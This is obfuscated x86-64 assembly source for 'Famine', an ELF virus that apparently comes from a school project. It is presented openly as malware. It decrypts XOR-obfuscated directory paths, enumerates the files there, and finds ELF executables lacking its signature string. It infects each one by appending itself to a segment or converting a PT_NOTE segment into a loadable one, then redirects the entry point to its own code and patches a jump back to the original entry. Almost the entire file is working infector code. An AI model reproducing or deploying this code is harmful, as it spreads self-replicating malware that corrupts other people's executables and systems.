; %include "famine.inc"
%include "obf_file.inc"

bits 64 
default rel

section .text
global _start

_start:
; placing EjCzV7zWv on the stack
push rbp
mov rbp, rsp
PUSHA
lea rdi, [rel GwMK34MPB4]     ; dir to open for arg readDir
mov rsi, fyXEusC7
call TgEV9uC7vZ

lea rdi, [rel I7PoMa]
mov rsi, R608jI
call TgEV9uC7vZ
aVJvz6u:
POPA
mov rsp, rbp
pop rbp
vESv6z:
jmp SPIuSsm

; take directory to open in rdi && size of pwd on rsi
TgEV9uC7vZ:
push rbp
mov rbp, rsp
push rax
push rsi
call _decrypt_str
mov rdi, rax
pop rsi
pop rax
sub rsp, EjCzV7zWv_size
push rsi
lea r8, FAM(EjCzV7zWv.QpxZLmj)
or qword [r8], -1
lea r8, FAM(EjCzV7zWv.pa98hvWY)
; mov r10, [rdi]
mov [r8], rdi
lea r8, FAM(EjCzV7zWv.SJTK2)
mov [r8], rsi
mov rax, 0x2
mov rsi, 0x0000| O_DIRECTORY 
xor rdx, rdx
syscall
cmp rax, 0 
pop rsi        ; Get the pDTWFt7 size back to unmap
jl uT8SHOJhBe
lea rdi, FAM(EjCzV7zWv.QpxZLmj)             ; enregistre le QpxZLmj dans la struct
mov [rdi], rax

B2GG6:
lea r10, FAM(EjCzV7zWv.QpxZLmj)
mov rdi, [r10]
lea r9, FAM(EjCzV7zWv.RwFtnZJB)              ; init RwFtnZJB
push r15
push r14
movq r15, xmm15
			movzx r14, byte [r15 + 1]
shl r14, 0x18
or DWORD [r9], r14D
			movzx r14, byte [r15 + 36]
shl r14, 0x10
or DWORD [r9],  r14D
			movzx r14, byte [r15 + 71]
shl r14, 0x8
or DWORD [r9], r14D
			movzx r14, byte [r15 + 106]
or DWORD [r9], r14D
pop r14
pop r15
mov rax, 0xd9
lea rsi, FAM(EjCzV7zWv.W25WTT)
mov rdx, 0x1000
syscall
cmp rax, 0 
jle uT8SHOJhBe

lea r10, FAM(EjCzV7zWv.zvSUIpXjJ)  ; r10 -> (struct EjCzV7zWv.diretents_struct_ptr)
mov [r10], rsi                           ; EjCzV7zWv.zvSUIpXjJ -> EjCzV7zWv.W25WTT
lea r11, FAM(EjCzV7zWv.f1d0FF)       ; r11 -> (struct EjCzV7zWv.f1d0FF)
mov DWORD [r11], eax 

DESWn2Vn:
lea r8, FAM(EjCzV7zWv.RwFtnZJB)        ; r8 -> total lu de getdents
lea r9, FAM(EjCzV7zWv.f1d0FF)        ; r9 -> total a lire de getdents
mov r10, FAM(EjCzV7zWv.zvSUIpXjJ)  ; r10 -> actual dirent struct
lea r11, FAM(EjCzV7zWv.zvSUIpXjJ)  ; r11 -> ptr de la struct actuelle
movzx r12, WORD [r10 + D_RECLEN_OFF] 
add [r8], r12d                          ; update du total lu dans r8
add [r11], r12                           ; EjCzV7zWv.diretns_struct_ptr -> sur la prochaine struct
cmp BYTE [r10 + D_TYPE], 0x8
jne DL7EKmxq

gU8MmO6Bp:
lea rsi, [r10 + D_NAME] 
mov byte [rsi - 1], '/'
sub rsi, FAM(EjCzV7zWv.SJTK2)
mov rdi, FAM(EjCzV7zWv.pa98hvWY)
call KnAvt1mmz

wNHaR:
call VYY1vwvAk

DL7EKmxq:
mov r8, FAM(EjCzV7zWv.RwFtnZJB)
mov r12, FAM(EjCzV7zWv.f1d0FF)
cmp r8d, r12d                   ; if (total lu >= total getdents)
mov rdi, FAM(EjCzV7zWv.pa98hvWY)
mov rsi, FAM(EjCzV7zWv.SJTK2)
jge B2GG6
jmp DESWn2Vn

VYY1vwvAk:
push rbp
mov rbp, rsp
sub rsp, sdo0BysL8f_size
lea rax, INF(sdo0BysL8f.kmMNfSQg)
mov qword [rax], 0 
lea rax, INF(sdo0BysL8f.gCa451)
push r15
push r14
movq r15, xmm15
			movzx r14, byte [r15 + 1]
shl r14, 0x18
or byte [rax], r14b
			movzx r14, byte [r15 + 36]
shl r14, 0x10
or byte [rax],  r14b
			movzx r14, byte [r15 + 71]
shl r14, 0x8
or byte [rax], r14b
			movzx r14, byte [r15 + 106]
or byte [rax], r14b
pop r14
pop r15
lea rax, INF(sdo0BysL8f.jbuURm)
mov qword [rax], 0 

bjbis:
mov rax, 0x2
mov rdi, rsi
mov rsi, 0x0002
xor rdx, rdx
syscall
cmp rax, 0x0 
jl B8kVNDp5l
mov INF(sdo0BysL8f.q7UhD3H7S), rax

; === get file size ===
vrNeOe:
mov rax, 0x8
mov rdi, INF(sdo0BysL8f.q7UhD3H7S)
mov rsi, 0x0 
mov rdx, 0x2
syscall
cmp rax, 0x0 
jle Edd7Xax
mov INF(sdo0BysL8f.rRcDlhMrQ), rax
mov INF(sdo0BysL8f.UKgLYq3), rax

we1HXFyH:
; rax -> map
mov rsi, rax        ; rsi = file_size
mov rax, 0x9
mov rdi, 0x0 
mov rdx, 0x2| 0x4| 0x1
mov r10, 0x1
mov r8, INF(sdo0BysL8f.q7UhD3H7S)
mov r9, 0x0 
syscall
cmp rax, 0x0 
jl Edd7Xax
lea r8, INF(sdo0BysL8f.PEi4ySPjb2)
mov [r8], rax

QfCmx0rnIo:
cmp dword [rax + 1], 0x02464c45 
jne z25PPq

RPcaTtZ:
; rax == total segment number
; r9 == injection offset
; r13 == original segment end offset
; r14 -> header table
; r15 -> map
mov r15, rax
mov r14, r15
add r14, [r14 + pRBkUrO5.PpDoFWp]
xor rcx, rcx
ebEwF:
cmp cx, [r15  + pRBkUrO5.Df0PttR7O]
jge B8LrSYf 
add r14, KlRU8_size
inc rcx
jmp ebEwF
B8LrSYf:
mov INF(sdo0BysL8f.r27Xqje), r14
xor r9, r9
BzJLd8HuO:
cmp cx, 0 
jle am74G
LoGTWkJof:
bt word [r14], 0 
jnc FG4L6
bt qword [r14], 0x20 
jc J24tHS9
FG4L6:
dec rcx
sub r14, KlRU8_size
jmp BzJLd8HuO

am74G:
mov r9, INF(sdo0BysL8f.kmMNfSQg)
cmp r9, 0 
je z25PPq
cmp byte INF(sdo0BysL8f.gCa451), 1 
je SekEeiZlc
jmp wNY349I          ; else jmp wNY349I

J24tHS9:
; Check if the segment signed, else check the size, if big enough save the offsets if not already done
p7q2p2:
; r8 -> potential oipSFt
; r9 == oipSFt variable
mov r8, r15
add r8, [r14 + KlRU8.KY1FY]
add r8, [r14 + KlRU8.zIxMP2]
sub r8, KEuiL
; mov r9, [rel oipSFt]
lea r9, oipSFt
; mov rdi, r9
; mov rsi, KEuiL
; push rax
; call _decrypt_str
; mov r9, rax
; pop rax
mov r10, [r9]
cmp qword r10, [r8]
je z25PPq
mov rdi, r9
mov rsi, KEuiL
push rcx
call hJjRO
pop rcx

ToexAg:
mov r9, INF(sdo0BysL8f.kmMNfSQg)
test r9, r9
jz MyHlc
mov r9, INF(sdo0BysL8f.gCa451)
test r9, r9
jz FG4L6

MyHlc:
; r8 == end of sdo0BysL8f offset
; r9 == next segment offset
mov r8, [r14 + KlRU8.KY1FY]
add r8, [r14 + KlRU8.zIxMP2]
mov r13, r8        ; save segment end's offset
add r8, CODE_LEN 
mov r9, r14
add r9, KlRU8_size
add r9, KlRU8.KY1FY
cmp [r9], r8
setb INF(sdo0BysL8f.gCa451)   ; if ([r9] < r8) { sdo0BysL8f.gCa451 = 1) }

yp1EJlf6Ql:
; r8 -> sdo0BysL8f structure members
; r9 == injection address
; r12 == original entrypoint
;*r13 == segment end's offset (MyHlc)
;*r14 -> segment header in header table
lea r8, INF(sdo0BysL8f.CxsCJPQD)
mov [r8], cl
lea r8, INF(sdo0BysL8f.ZF0R4vA)
mov r12, [r15 + pRBkUrO5.jPUACXO4wu]
mov [r8], r12
lea r8, INF(sdo0BysL8f.kmMNfSQg)
mov [r8], r13
lea r8, INF(sdo0BysL8f.gzUNX)
push r9
mov r9, [r14 + KlRU8.hMiLM8]
add r9, [r14 + KlRU8.SZmjGzMVKM]
mov [r8], r9
pop r9
lea r8, INF(sdo0BysL8f.URL1aZ)
mov [r8], r14
jmp FG4L6

SekEeiZlc:
hPJNX:
mov rax, 0x4d
mov rdi, INF(sdo0BysL8f.q7UhD3H7S)
lea rsi, INF(sdo0BysL8f.rRcDlhMrQ)
push qword [rsi]
add qword [rsi], 0x1000
and qword [rsi], -4096
add qword [rsi], CODE_LEN 
mov rsi, [rsi]
syscall
pop rsi
cmp rax, 0 
jl z25PPq

e3U0lYwbpj:
mov rdi, INF(sdo0BysL8f.PEi4ySPjb2)
mov rax, 0xb
syscall

DtjuvoA:
mov rax, 0x9
mov rdi, 0x0 
mov rsi, INF(sdo0BysL8f.rRcDlhMrQ)    ; rsi = file_size
mov rdx, 0x2| 0x4| 0x1
mov r10, 0x1
mov r8, INF(sdo0BysL8f.q7UhD3H7S)
mov r9, 0x0 
syscall
cmp rax, 0x0 
jl Edd7Xax
lea r8, INF(sdo0BysL8f.PEi4ySPjb2)
mov [r8], rax

MAGQ1nsn:
mov r14, INF(sdo0BysL8f.PEi4ySPjb2)
movzx rax, word [r14 + pRBkUrO5.o64cTvXn]
add r14, [r14 + pRBkUrO5.GcnemzIA]
xor rcx, rcx

DETWez:
cmp rcx, rax
jge A4wnlB
mov rbx, [r14 + i1swc.SUJg152kSB]
add rbx, [r14 + i1swc.ewzLE]
cmp INF(sdo0BysL8f.jbuURm), rbx
jge q16Kd
mov INF(sdo0BysL8f.jbuURm), rbx

q16Kd:
add r14, i1swc_size
inc rcx
jmp DETWez

A4wnlB:

TZui2C:
; r14 -> segmentS header
; rcx == segment counter
mov r14, INF(sdo0BysL8f.PEi4ySPjb2)
movzx rax, word [r14 + pRBkUrO5.Df0PttR7O]
add r14, [r14 + pRBkUrO5.PpDoFWp]
xor rcx, rcx

gvGG2v:
cmp rcx, rax
jge dSxvCa
cmp dword [r14 + KlRU8.xXBiSq], 0x4
je DLLhns

XQTBLwN:
add r14, KlRU8_size
inc rcx
jmp gvGG2v

dSxvCa:
mov r14, -1 

DLLhns:
; r14 -> segment header
; rax == new offset / address
cmp r14, 0 
jl bXSqw5dG
mov dword [r14 + KlRU8.xXBiSq], 0x1
mov qword [r14 + KlRU8.Gpf3h00m3], 0x1| 0x4
mov qword [r14 + KlRU8.zIxMP2], CODE_LEN 
mov qword [r14 + KlRU8.SZmjGzMVKM], CODE_LEN 
mov qword [r14 + KlRU8.unJFClezF], 0x1000 
mov rax, INF(sdo0BysL8f.UKgLYq3)
add rax, 0x1000 
and rax, -4096
mov qword [r14 + KlRU8.KY1FY], rax
mov qword INF(sdo0BysL8f.kmMNfSQg), rax
mov rax, INF(sdo0BysL8f.jbuURm)
add rax, 0x1000 
and rax, -4096
mov qword INF(sdo0BysL8f.gzUNX), rax
mov qword [r14 + KlRU8.hMiLM8], rax
mov qword [r14 + KlRU8.eaXpnLdaO7], rax

wNY349I:
gFRDsBehV8:
; r8 -> elf header entrypoint
; r9 == end of segment + align (injection offset)
; r10 == injection offset
mov r8, INF(sdo0BysL8f.PEi4ySPjb2)
add r8, pRBkUrO5.jPUACXO4wu
mov r10, INF(sdo0BysL8f.gzUNX)
mov [r8], r10
cmp byte INF(sdo0BysL8f.gCa451), 0 
jg KJXndUge
mov rdi, CODE_LEN 
call VRVNdP

KJXndUge:
; rdi -> injection start
; rsi -> parasite _start
; rcx == code len (gLj4boEu - _start)
mov rdi, INF(sdo0BysL8f.PEi4ySPjb2)
add rdi, INF(sdo0BysL8f.kmMNfSQg)
lea rsi, [rel _start]     ; rsi -> start of our code
mov rcx, CODE_LEN 
cld          ; copy from _start to gLj4boEu (= !std)
rep movsb

bXSqw5dG:
; r8 -> vESv6z instruction's addr (vESv6z + 1)
; r9 == distance to jump from final jump to original entry point
mov r8, INF(sdo0BysL8f.PEi4ySPjb2)
add r8, INF(sdo0BysL8f.kmMNfSQg)
add r8, FINJMP_OFF 
inc r8
mov r10, INF(sdo0BysL8f.gzUNX)
add r10, FINJMP_OFF 
add r10, 0x05 
mov r9, INF(sdo0BysL8f.ZF0R4vA)
sub r9, r10
mov [r8], r9d
jmp z25PPq

VRVNdP:
; r8 -> segment header data
;*r14 -> segment header in header table

mov r8, INF(sdo0BysL8f.URL1aZ)
push r8           ; save header start for later

; * Update file size *
add r8, qword KlRU8.zIxMP2
add qword [r8], rdi
pop r8

; * Update memory size *
add r8, KlRU8.SZmjGzMVKM
add qword [r8], rdi

ret

z25PPq:
lea rdi, INF(sdo0BysL8f.PEi4ySPjb2)
lea rsi, INF(sdo0BysL8f.rRcDlhMrQ)
call hJjRO
jmp Edd7Xax

hJjRO:
mov rax, 0xb
syscall
ret

Edd7Xax:
mov rax, 0x3
mov rdi, INF(sdo0BysL8f.q7UhD3H7S)
syscall
mov qword INF(sdo0BysL8f.q7UhD3H7S), -1
jmp B8kVNDp5l

uT8SHOJhBe:
mov rdi, FAM(EjCzV7zWv.QpxZLmj)
cmp rdi, 0 
jle B8kVNDp5l
mov rax, 0x3
syscall
mov rdi, FAM(EjCzV7zWv.pa98hvWY)
mov rsi, FAM(EjCzV7zWv.SJTK2)
call hJjRO
or qword FAM(EjCzV7zWv.QpxZLmj), -1
jmp B8kVNDp5l

B8kVNDp5l:
leave
ret

SPIuSsm:
mov rax, 60 
xor rdi, rdi
syscall

;strcpy(dst:rsi src: rdi) (without /0 at the end)
KnAvt1mmz:
xor rcx, rcx
tRvnGN:
cmp byte [rdi + rcx], 0 
je FoPJ9dX
mov al, byte [rdi + rcx]
mov [rsi + rcx], al
add rcx, 1 
jmp tRvnGN

FoPJ9dX:

ret

; rax: int *_map_int_table( void )
_map_int_table:
; rax -> new map
push rdi
push rsi
push rdx
push r10
push r8
push r9
mov rax, 0x9
mov rdi, 0x0 
mov rsi, 0x8c 
mov rdx, 0x2| 0x4
mov r10, 0x1
mov r8, -1
mov r9, 0x0 
syscall
cmp rax, -1
jl _end_map_int
movq xmm15, rax
mov qword [rax + 0], 0x00000000 
mov qword [rax + 4], 0x02000000 
mov qword [rax + 8], 0x00000000 
mov qword [rax + 12], 0x00000000 
mov qword [rax + 16], 0x00000000 
mov qword [rax + 20], 0x00000000 
mov qword [rax + 24], 0x00000000 
mov qword [rax + 28], 0x00000000 
mov qword [rax + 35], 0x00000000 
mov qword [rax + 39], 0x46000000 
mov qword [rax + 43], 0x00000000 
mov qword [rax + 47], 0x00000000 
mov qword [rax + 51], 0x00000000 
mov qword [rax + 55], 0x00000000 
mov qword [rax + 59], 0x00000000 
mov qword [rax + 63], 0x00000000 
mov qword [rax + 70], 0x00000000 
mov qword [rax + 74], 0x4c001000 
mov qword [rax + 78], 0x00000000 
mov qword [rax + 82], 0x00000000 
mov qword [rax + 86], 0x00000000 
mov qword [rax + 90], 0x00000000 
mov qword [rax + 94], 0x00000000 
mov qword [rax + 98], 0x00000000 
mov qword [rax + 105], 0x64000100 
mov qword [rax + 109], 0x45200005 
mov qword [rax + 113], 0x60030203 
mov qword [rax + 117], 0x22020945 
mov qword [rax + 121], 0x00440308 
mov qword [rax + 125], 0x090b3c4d 
mov qword [rax + 129], 0xd9000102 
mov qword [rax + 133], 0x08101213 
_end_map_int:
pop r9
pop r8
pop r10
pop rdx
pop rsi
pop rdi
ret
; rax: char *_decrypt_str(rsi: char *to_decrypt, rdi: len)
_decrypt_str:
; rax == div quotient
; rbx -> to_decrypt
; rcx == counter
; rdx == div modulo
; r9 == len ubUxsS
; r10 -> key_char
; r11 -> decrypted str (mmap)
; r12 == len to_decrypt
; rsi -> ubUxsS
push rbx
push rcx
push rdx
push r8
push r9
push r10
push r11
push r12
mov rbx, rdi
mov r12, rsi
xor rdi, rdi 
mov rdx, 0x03 
mov r10, 0x22 
mov r8, -1                      ; QpxZLmj = -1
xor r9, r9 
mov rax, 9 
syscall
cmp rax, 0 
jl _decrypt_loop_end
movq xmm15, rax
mov r11, rax
lea rsi, ubUxsS
call L5FpB
mov r9, rax
xor rcx, rcx
xor rdx, rdx
_decrypt_loop:
cmp rcx, r12
jge _decrypt_loop_end
mov rax, rcx
xor rdx, rdx
cmp rcx, 0 
jne _no_zero
xor rax, rax
jmp _end_div
_no_zero:
div r9
_end_div:
movzx r10, byte [rsi + rdx] ; r10 == ubUxsS[rcx % ubUxsS_len]
xor r10b, [rbx + rcx]
mov [r11 + rcx], r10b
inc rcx
jmp _decrypt_loop
_decrypt_loop_end:
mov rax, r11
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdx
pop rcx
pop rbx
ret
 
;; rax: char *_decrypt_str(rsi: char *to_decrypt, rdi: len)
ZOllo:
;; rax == div quotient
;; rbx -> to_decrypt
;; rcx == counter
;; rdx == div modulo
;; r9 == len ubUxsS
;; r10 -> key_char
;; r11 -> decrypted str (mmap)
;; r12 == len to_decrypt
;; rsi -> ubUxsS
;push rbx
;push rcx
;push rdx
;push r8
;push r9
;push r10
;push r11
;push r12
;mov rbx, rdi
;mov r12, rsi



;mov r8, -1                      ; QpxZLmj = -1


;syscall

;jl _decrypt_loop_end
;mov r11, rax
;lea rsi, ubUxsS
;call L5FpB
;mov r9, rax
;xor rcx, rcx
;xor rdx, rdx
Gm17tkQI8:
;cmp rcx, r12
;jge _decrypt_loop_end
;mov rax, rcx
;xor rdx, rdx

;jne _no_zero
;xor rax, rax
;jmp _end_div
iQJAF3lZ7:
;div r9
JvX8cfYkK:
;movzx r10, byte [rsi + rdx] ; r10 == ubUxsS[rcx % ubUxsS_len]
;xor r10b, [rbx + rcx]
;mov [r11 + rcx], r10b
;inc rcx
;jmp _decrypt_loop
Jb7pl:
;mov rax, r11
;pop r12
;pop r11
;pop r10
;pop r9
;pop r8
;pop rdx
;pop rcx
;pop rbx
;ret

; debug
; strlen(str:rsi)
L5FpB:
xor rcx, rcx

yGEvS:
cmp byte [rsi + rcx], 0 
je FTRzeCH
inc rcx
jmp yGEvS

FTRzeCH:
mov rax, rcx
ret


bP7NyIW5wB dq 0x45 
pDTWFt7 db 0x6B, 0x28, 0x21, 0x41, 0x05, 0x43, 0x2D, 0x2F, 0x06, 0x2A, 0x44, 0x19, 0x4D, 0x7B 
GwMK34MPB4 db 0x05, 0x0F, 0x25, 0x5C, 0x5A, 0x5B, 0x2D, 0x0F, 0x06, 0x58 
fyXEusC7    equ $ - GwMK34MPB4
I7PoMa db 0x05, 0x0F, 0x25, 0x5C, 0x5A, 0x5B, 0x2D, 0x0F, 0x06, 0x6A, 0x2D 
R608jI    equ $ - I7PoMa
ubUxsS db 0x2A, 0x7B, 0x48, 0x2C, 0x75, 0x2F, 0x48, 0x7C, 0x72, 0x58, 0x2D, 0x77 
Gvd6BlzaHK db 0x44, 0x22, 0x22, 0x22, 0x22, 0x00 
oipSFt db "Famine version 1.0 (c)oded by anvincen-eedy", 0x0 
KEuiL equ $ - oipSFt
gLj4boEu: 